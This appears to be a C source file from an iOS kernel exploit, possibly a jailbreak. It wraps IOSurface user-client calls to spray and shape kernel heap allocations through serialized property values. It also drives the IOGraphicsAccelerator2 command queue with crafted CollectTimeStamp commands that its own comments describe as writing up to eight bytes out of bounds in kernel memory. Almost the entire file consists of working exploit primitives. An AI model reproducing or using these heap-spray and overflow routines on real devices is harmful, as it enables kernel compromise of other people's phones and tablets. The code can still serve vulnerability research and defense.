#include "io.h"
#include "offsets.h"
#include "time_saved.h"

uint32_t ps;
io_connect_t IOSurfaceRoot;
io_service_t IOSurfaceRootUserClient;
uint32_t IOSurface_ID;

int init_IOSurface() {
    kern_return_t ret = _host_page_size(mach_host_self(), (vm_size_t*)&ps);
    struct utsname a;
    uname(&a);
    if (strstr(a.machine, "iPad5,")) {
        printf("[i] detected iPad5,... using 4k pagesize\n");
        ps = 0x1000;
    }
    
    if (ret) {
        printf("[-] failed to get page size! 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    
    printf("[i] page size: 0x%x\n", ps);
    
    IOSurfaceRoot = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!MACH_PORT_VALID(IOSurfaceRoot)) {
        printf("[-] Failed to find IOSurfaceRoot service\n");
        return KERN_FAILURE;
    }
    
    ret = IOServiceOpen(IOSurfaceRoot, mach_task_self(), 0, &IOSurfaceRootUserClient);
    if (ret || !MACH_PORT_VALID(IOSurfaceRootUserClient)) {
        printf("[-] failed to open IOSurfaceRootUserClient: 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    
    struct IOSurfaceFastCreateArgs create_args = {
        .alloc_size = ps
    };
    
    struct IOSurfaceLockResult lock_result;
    size_t lock_result_size = koffset(IOSURFACE_CREATE_OUTSIZE);
    
    ret = IOConnectCallMethod(IOSurfaceRootUserClient, 6, NULL, 0, &create_args, sizeof(create_args), NULL, NULL, &lock_result, &lock_result_size);
    if (ret) {
        printf("[-] failed to create IOSurfaceClient: 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    
    IOSurface_ID = lock_result.surface_id;
    
    return 0;
}

int IOSurface_setValue(struct IOSurfaceValueArgs *args, size_t args_size) {
    struct IOSurfaceValueResultArgs result;
    size_t result_size = sizeof(result);
    
    kern_return_t ret = IOConnectCallMethod(IOSurfaceRootUserClient, 9, NULL, 0, args, args_size, NULL, NULL, &result, &result_size);
    if (ret) {
        printf("[-][IOSurface] Failed to set value: 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    return 0;
}

int IOSurface_getValue(struct IOSurfaceValueArgs *args, int args_size, struct IOSurfaceValueArgs *output, size_t *out_size) {
    kern_return_t ret = IOConnectCallMethod(IOSurfaceRootUserClient, 10, NULL, 0, args, args_size, NULL, NULL, output, out_size);
    if (ret) {
        printf("[-][IOSurface] Failed to get value: 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    return 0;
}

int IOSurface_removeValue(struct IOSurfaceValueArgs *args, size_t args_size) {
    struct IOSurfaceValueResultArgs result;
    size_t result_size = sizeof(result);
    
    kern_return_t ret = IOConnectCallMethod(IOSurfaceRootUserClient, 11, NULL, 0, args, args_size, NULL, NULL, &result, &result_size);
    if (ret) {
        printf("[-][IOSurface] Failed to remove value: 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    return 0;
}

int IOSurface_remove_property(uint32_t key) {
    uint32_t argsSz = sizeof(struct IOSurfaceValueArgs) + 2 * sizeof(uint32_t);
    struct IOSurfaceValueArgs *args = malloc(argsSz);
    bzero(args, argsSz);
    args->surface_id = IOSurface_ID;
    args->binary[0] = key;
    args->binary[1] = 0;
    int ret = IOSurface_removeValue(args, 16);
    free(args);
    return ret;
}

int IOSurface_empty_kalloc(uint32_t size, uint32_t kalloc_key) {
    uint32_t capacity = size / 16;
    
    if (capacity > 0x00ffffff) {
        printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
        return KERN_FAILURE;
    }
    
    size_t args_size = sizeof(struct IOSurfaceValueArgs) + 9 * 4;
    
    struct IOSurfaceValueArgs *args = calloc(1, args_size);
    args->surface_id = IOSurface_ID;
    
    int i = 0;
    args->binary[i++] = kOSSerializeBinarySignature;
    args->binary[i++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeDictionary | capacity;
    args->binary[i++] = kOSSerializeSymbol | 4;
    args->binary[i++] = 0x00aabbcc;
    args->binary[i++] = kOSSerializeBoolean | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection;
    args->binary[i++] = kalloc_key;
    args->binary[i++] = 0;
    
    kern_return_t ret = IOSurface_setValue(args, args_size);
    free(args);
    return ret;
}

int IOSurface_kmem_alloc(void *data, uint32_t size, uint32_t kalloc_key) {
    if (size < ps) {
        printf("[-][IOSurface] Size too small for kmem_alloc\n");
        return KERN_FAILURE;
    }
    if (size > 0x00ffffff) {
        printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
        return KERN_FAILURE;
    }
    
    size_t args_size = sizeof(struct IOSurfaceValueArgs) + ((size + 3)/4) * 4 + 6 * 4;
    
    struct IOSurfaceValueArgs *args = calloc(1, args_size);
    args->surface_id = IOSurface_ID;
    
    int i = 0;
    args->binary[i++] = kOSSerializeBinarySignature;
    args->binary[i++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeData | size;
    memcpy(&args->binary[i], data, size);
    i += (size + 3)/4;
    args->binary[i++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection;
    args->binary[i++] = kalloc_key;
    args->binary[i++] = 0;
    
    kern_return_t ret = IOSurface_setValue(args, args_size);
    free(args);
    return ret;
}

int IOSurface_kmem_alloc_spray(void *data, uint32_t size, int count, uint32_t kalloc_key) {
    if (size < ps) {
        printf("[-][IOSurface] Size too small for kmem_alloc\n");
        return KERN_FAILURE;
    }
    if (size > 0x00ffffff) {
        printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
        return KERN_FAILURE;
    }
    if (count > 0x00ffffff) {
        printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
        return KERN_FAILURE;
    }
    
    size_t args_size = sizeof(struct IOSurfaceValueArgs) + count * (((size + 3)/4) * 4) + 6 * 4 + count * 4;
    
    struct IOSurfaceValueArgs *args = calloc(1, args_size);
    args->surface_id = IOSurface_ID;
    
    int i = 0;
    args->binary[i++] = kOSSerializeBinarySignature;
    args->binary[i++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeArray | count;
    for (int c = 0; c < count; c++) {
        args->binary[i++] = kOSSerializeData | size | ((c == count - 1) ? kOSSerializeEndCollection : 0);
        memcpy(&args->binary[i], data, size);
        i += (size + 3)/4;
    }
    args->binary[i++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection;
    args->binary[i++] = kalloc_key;
    args->binary[i++] = 0;
    
    kern_return_t ret = IOSurface_setValue(args, args_size);
    free(args);
    return ret;
}

void term_IOSurface() {
    if (IOSurfaceRoot) IOObjectRelease(IOSurfaceRoot);
    if (IOSurfaceRootUserClient) IOServiceClose(IOSurfaceRootUserClient);
    
    IOSurfaceRoot = 0;
    IOSurfaceRootUserClient = 0;
    IOSurface_ID = 0;
}

io_connect_t IOAccelCommandQueue2 = IO_OBJECT_NULL;
io_connect_t IOAccelSharedUserClient2 = IO_OBJECT_NULL;
io_service_t IOGraphicsAccelerator2;

kern_return_t IOAccelSharedUserClient2_create_shmem(size_t size, struct IOAccelDeviceShmemData *shmem) {
    size_t out_size = sizeof(*shmem);
    uint64_t shmem_size = size;
    return IOConnectCallMethod(IOAccelSharedUserClient2, IOAccelSharedUserClient2_create_shmem_selector, &shmem_size, 1, NULL, 0, NULL, NULL, shmem, &out_size);
}


kern_return_t IOAccelCommandQueue2_set_notification_port(mach_port_t notification_port) {
    return IOConnectCallAsyncMethod(IOAccelCommandQueue2, IOAccelCommandQueue2_set_notification_port_selector, notification_port, NULL, 0, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
}

kern_return_t IOAccelCommandQueue2_submit_command_buffers(const struct IOAccelCommandQueueSubmitArgs_Header *submit_args, size_t size) {
    return IOConnectCallMethod(IOAccelCommandQueue2, IOAccelCommandQueue2_submit_command_buffers_selector, NULL, 0, submit_args, size, NULL, NULL, NULL, NULL);
}

struct {
    struct IOAccelCommandQueueSubmitArgs_Header header;
    struct IOAccelCommandQueueSubmitArgs_Command command;
} submit_args = {};

int alloc_shmem(uint32_t buffer_size, struct IOAccelDeviceShmemData *cmdbuf, struct IOAccelDeviceShmemData *seglist) {
    struct IOAccelDeviceShmemData command_buffer_shmem;
    struct IOAccelDeviceShmemData segment_list_shmem;
    
    kern_return_t kr = IOAccelSharedUserClient2_create_shmem(buffer_size, &command_buffer_shmem);
    if (kr) {
        printf("[-] IOAccelSharedUserClient2_create_shmem: 0x%x (%s)\n", kr, mach_error_string(kr));
        return kr;
    }
    
    kr = IOAccelSharedUserClient2_create_shmem(buffer_size, &segment_list_shmem);
    if (kr) {
        printf("[-] IOAccelSharedUserClient2_create_shmem: 0x%x (%s)\n", kr, mach_error_string(kr));
        return kr;
    }
    
    *cmdbuf = command_buffer_shmem;
    *seglist = segment_list_shmem;
    
    submit_args.header.count = 1;
    submit_args.command.command_buffer_shmem_id = command_buffer_shmem.shmem_id;
    submit_args.command.segment_list_shmem_id = segment_list_shmem.shmem_id;

    struct IOAccelSegmentListHeader *slh = segment_list_shmem.data;
    slh->length = 0x100;
    slh->segment_count = 1;
    
    struct IOAccelSegmentResourceListHeader *srlh = (void *)(slh + 1);
    srlh->kernel_commands_start_offset = 0;
    srlh->kernel_commands_end_offset = buffer_size;
    
    // this is just a filler for the first 0x4000 - n bytes, timestamp written in off_timestamp = 8
    struct IOAccelKernelCommand_CollectTimeStamp *cmd1 = command_buffer_shmem.data;
    cmd1->command.type = 2;
    cmd1->command.size = (uint32_t)buffer_size - 16;
    
    // put command 2 after command 1, so now timestamp written in cmd1->command.size + off_timestamp (8) = 0x4000 <= 8 bytes written OOB!
    struct IOAccelKernelCommand_CollectTimeStamp *cmd2 = (void *)((uint8_t *)cmd1 + cmd1->command.size);
    cmd2->command.type = 2;
    cmd2->command.size = 8;
    
    return IOAccelCommandQueue2_submit_command_buffers(&submit_args.header, sizeof(submit_args));
}

int overflow_n_bytes(uint32_t buffer_size, int n, struct IOAccelDeviceShmemData *cmdbuf, struct IOAccelDeviceShmemData *seglist) {
    if (n > 8 || n < 0) {
        printf("[-] Can't overflow: 0 <= n <= 8\n");
        return -1;
    }
    
    submit_args.header.count = 1;
    submit_args.command.command_buffer_shmem_id = cmdbuf->shmem_id;
    submit_args.command.segment_list_shmem_id = seglist->shmem_id;

    struct IOAccelSegmentListHeader *slh = seglist->data;
    slh->length = 0x100;
    slh->segment_count = 1;
    
    struct IOAccelSegmentResourceListHeader *srlh = (void *)(slh + 1);
    srlh->kernel_commands_start_offset = 0;
    srlh->kernel_commands_end_offset = buffer_size;
    
    // this is just a filler for the first buffer_size - n bytes, timestamp written in off_timestamp = 8
    struct IOAccelKernelCommand_CollectTimeStamp *cmd1 = cmdbuf->data;
    cmd1->command.type = 2;
    cmd1->command.size = (uint32_t)buffer_size - 16 + n;
       
    // put command 2 after command 1, so now timestamp written in cmd1->command.size + off_timestamp (8) = buffer_size - 8 + n <= n bytes written OOB!
    struct IOAccelKernelCommand_CollectTimeStamp *cmd2 = (void *)((uint8_t *)cmd1 + cmd1->command.size);
    cmd2->command.type = 2;
    cmd2->command.size = 8;
    
    return IOAccelCommandQueue2_submit_command_buffers(&submit_args.header, sizeof(submit_args));
}

int make_buffer_readable_by_kernel(void *buffer, uint64_t n_pages) {
    for (int i = 0; i < n_pages * ps; i += ps) {
        struct IOAccelKernelCommand_CollectTimeStamp *ts_cmd = (struct IOAccelKernelCommand_CollectTimeStamp *)(((uint8_t *)buffer) + i);
        bool end = i == (n_pages * ps - ps);
        ts_cmd->command.type = 2;
        ts_cmd->command.size = ps - (end ? sizeof(struct IOAccelKernelCommand_CollectTimeStamp) : 0);
        
        // we have to write something because... memory stuff
        *(((uint8_t *)buffer) + i) = 0;
    }
    return IOAccelCommandQueue2_submit_command_buffers(&submit_args.header, sizeof(submit_args));
}

int init_IOAccelerator() {
    IOGraphicsAccelerator2 = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOGraphicsAccelerator2"));
    if (!IOGraphicsAccelerator2) {
        printf("[-] Failed to find IOGraphicsAccelerator2 service\n");
        return KERN_FAILURE;
    }

    kern_return_t kr = IOServiceOpen(IOGraphicsAccelerator2, mach_task_self(), IOAccelCommandQueue2_type, &IOAccelCommandQueue2);
    if (kr) {
        // iOS 12. should probably move this to offsets.m
        kern_return_t kr2 = IOServiceOpen(IOGraphicsAccelerator2, mach_task_self(), 5, &IOAccelCommandQueue2);
        if (kr2) {
            printf("[-] Failed to open IOAccelCommandQueue2: 0x%x (%s)\n", kr, mach_error_string(kr));
            return kr;
        }
    }

    kr = IOServiceOpen(IOGraphicsAccelerator2, mach_task_self(),
            IOAccelSharedUserClient2_type, &IOAccelSharedUserClient2);
    if (kr) {
        printf("[-] Failed to open IOAccelSharedUserClient2: 0x%x (%s)\n", kr, mach_error_string(kr));
        return kr;
    }
    
    kr = IOConnectAddClient(IOAccelCommandQueue2, IOAccelSharedUserClient2);
    if (kr) {
        printf("[-] Failed to connect IOAccelCommandQueue2 to IOAccelSharedUserClient2: 0x%x (%s)\n", kr, mach_error_string(kr));
        return kr;
    }

    mach_port_t notification_port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notification_port);
    IOAccelCommandQueue2_set_notification_port(notification_port);
    
    return 0;
}

void term_IOAccelerator() {
    if (IOGraphicsAccelerator2) IOObjectRelease(IOGraphicsAccelerator2);
    if (IOAccelCommandQueue2) IOServiceClose(IOAccelCommandQueue2);
    if (IOAccelSharedUserClient2) IOServiceClose(IOAccelSharedUserClient2);
    
    IOGraphicsAccelerator2 = 0;
    IOAccelCommandQueue2 = 0;
    IOAccelSharedUserClient2 = 0;
}
